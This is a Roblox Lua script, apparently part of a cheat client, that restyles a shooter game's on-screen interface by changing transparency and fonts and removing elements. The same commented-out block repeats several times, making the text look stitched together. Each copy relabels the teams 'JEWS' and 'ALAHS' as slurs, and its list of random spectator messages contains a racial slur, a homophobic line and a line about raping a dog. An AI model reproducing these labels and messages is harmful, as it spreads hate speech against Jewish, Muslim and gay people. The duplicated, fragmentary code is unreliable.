	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

